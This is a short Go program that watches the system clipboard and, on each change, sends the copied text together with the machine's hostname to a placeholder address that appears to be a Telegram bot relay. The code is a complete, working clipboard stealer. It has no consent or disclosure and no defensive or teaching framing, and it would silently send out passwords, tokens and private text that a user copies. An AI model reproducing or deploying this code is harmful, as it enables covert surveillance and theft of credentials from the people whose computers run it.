package main

import (
	// Standard

	"context"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"

	"golang.design/x/clipboard"
	// Sub Repositories
)

func main() {
	err := clipboard.Init()
	if err != nil {
		panic(err)
	}
	ch := clipboard.Watch(context.TODO(), clipboard.FmtText)
	for data := range ch {
		// print out clipboard data whenever it is changed
		println(string(data))
		send(string(data))
	}
	fmt.Println()
}
func send(mdata string) {
	name, err := os.Hostname()
	jsonString := "{\"system_name\":\"" + name + "\",\"copy_data\": \"" + mdata + "\" }"
	mdata = jsonString
	params := "m=" + url.QueryEscape(mdata)
	path := fmt.Sprintf("##LINK of telegram bot api##/telegramapi.php?%s", params)
	resp, err := http.Get(path)

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(string(body))
}
